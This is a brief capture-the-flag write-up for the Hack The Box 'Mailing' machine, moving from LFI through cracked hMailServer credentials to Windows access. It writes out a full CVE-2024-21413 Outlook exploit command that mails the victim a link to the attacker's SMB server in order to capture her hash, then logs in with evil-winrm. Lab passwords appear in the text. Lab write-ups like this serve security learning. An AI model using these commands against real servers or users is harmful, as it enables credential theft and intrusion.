---
description: Windows | easy | IIS server | LFI | hMailServer | CVE-2024-21413 Outlook
---

# Mailing



<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

On the website we can see an upload button to download pdf instruction for mail connection. with an email sent to maya@mailing.htb.



When we intercept it whith burp we can see an LFI. After looking for IIS intersting files we did check on hMailServer files to find the .ini files with Mysql credentials.





<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Lets use Hashcat to decrypt the hash :&#x20;

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

&#x20;Administrator:homenetworkingadministrator

&#x20;now that we have a password we looked for a another CVE and found CVE-2024-21413

[https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.git](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.git)

```bash
python3 CVE-2024-21413.py --server "10.10.11.14" --port 465 --username "Administrator@mailing.htb" --password "homenetworkingadministrator" --sender "Administrator@mailing.htb" --recipient "maya@mailing.htb" --url "
\\OURIP\message
" --subject "frfr"
```

goal is to send a mail to maya with a malicious link. when she will click on it she will contact ou smb server and we will intercept her Hash.&#x20;





evil-winrm -i 10.129.231.40 -u maya -p 'm4y4ngs4ri'



m4y4ngs4ri
